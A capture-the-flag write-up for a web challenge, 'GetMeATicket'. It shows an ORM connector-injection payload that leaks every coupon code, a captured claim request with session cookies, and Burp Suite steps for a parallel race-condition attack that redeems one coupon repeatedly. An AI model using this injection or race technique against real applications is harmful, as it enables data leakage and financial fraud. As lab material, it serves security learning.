# GetMeATicket

Description:

```
So, my girlfriend, she hates academics. She's been so lazy that this semester her grades are LITERALLY 'F'. And she's blaming me for it as if I am the reason. Anyways, whats done is done. All we can do now is just sit here and whine.... or... we could just hack the portal and give her 'S' grades? I am not good at whining. Getting an all 'S' grade will make her happy and hopefully the Principal too! Here is her campus portal login credentials:

grumpycat@campuslink.com:IHateC0llege123

Solves: 7
```

Ok third least solved one. I felt like it deserves a writeup too.
So I saw many people going around and thinking outside the box. Just dont, its just simple question: Get her the ticket.
Now first thing you have to do is to
![Pasted image 20260201095325.png](Pasted%20image%2020260201095325.png)

Note that somewhere.
Now login and try doing a coupon check.

![Pasted image 20260201095450.png](Pasted%20image%2020260201095450.png)

ok we already know there is one valid token. Brute force wont work. But if you think about it we still have to leak that token. Research a bit more and you will find: [CVE-2025-64459](https://forms.gle/tPAJAQzx2cCzZLrx6)
Just try it with this payload:

```json
{ "code": "test", "_connector": ") OR 1=1 OR (" }
```

it will leak the codes ( these codes are different for each others you cheaters I caught you )

```json
{
  "valid": true,
  "message": "Matching coupons found",
  "coupons": [
    { "code": "IWwUp5sE", "is_used": true, "used_by": "user_d50b1213" },
    { "code": "5J7ISasV", "is_used": true, "used_by": "user_1a9bc62d" },
    { "code": "tL2QJDSi", "is_used": true, "used_by": "user_ff5b854a" },
    { "code": "1yYDHt90", "is_used": true, "used_by": "user_30ff6b96" },
    { "code": "XlAc7kG7", "is_used": true, "used_by": "user_77339b34" },
    { "code": "NqNriAvY", "is_used": true, "used_by": "user_5b16c782" },
    { "code": "LumJfDCU", "is_used": true, "used_by": "user_be8a8169" },
    { "code": "3dMTWI3P", "is_used": false, "used_by": null },
    { "code": "fIKzO15a", "is_used": true, "used_by": "user_eb31448a" },
    { "code": "5Hopkzgl", "is_used": true, "used_by": "user_932bfde3" }
  ]
}
```

There will always be only one with is_used: false
use that but you willl only have 5000 as balance. But the ticket costs 30K
![Pasted image 20260201100539.png](Pasted%20image%2020260201100539.png)

Request to claim is:

```http
POST /accounts/gimmemydiscount/ HTTP/1.1
Host: node-3.mcsc.space:35488
Content-Length: 19
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://node-3.mcsc.space:35488
Referer: http://node-3.mcsc.space:35488/dashboard/
Accept-Encoding: gzip, deflate, br
Cookie: session_token=eyJ1c2VyX2lkIjoxfQ.aX7FdA.9fgIKiJ95MCSbaPkLhzgQBlIK5Y; csrftoken=ASsaZRmBj9aJdZx8wJuvQUhPvwcBr9WK; sessionid=ieqhs11fcwopx3txx3u3jexzk3bz1r7j
Connection: keep-alive

{"code":"3dMTWI3P"}
```

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Sun, 01 Feb 2026 04:35:25 GMT
Connection: close
Content-Type: application/json
Vary: Accept, Cookie, origin
Allow: POST, OPTIONS
X-Frame-Options: DENY
Content-Length: 64
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
access-control-allow-origin: http://node-3.mcsc.space:35488
access-control-allow-credentials: true

{"message":"Coupon claimed successfully, 5000 added to balance"}
```

Wait.. Did u see something? Did you?? Did Youuuuu??? I didd!!! Look at `HTTP/1.1`

https://portswigger.net/research/http1-must-die ( always be updated guys)

Steps to claim:

1. Unclaim the token
2. Capture the request again
3. Sent to repeater
4. Rick click on the tab, Group it
5. Press ctrl + r repeated
6. Group the request
7. Click Drop Down on the send button
8. Clcik ( send group in parallel last byte desync)

![Pasted image 20260201103415.png](Pasted%20image%2020260201103415.png)

Buy the ticket:

![Pasted image 20260201103441.png](Pasted%20image%2020260201103441.png)

Hope you loved it: 🙂. Be in the discord server to help each other, learn and grow...

psychoSherlock 🕵️‍♂️
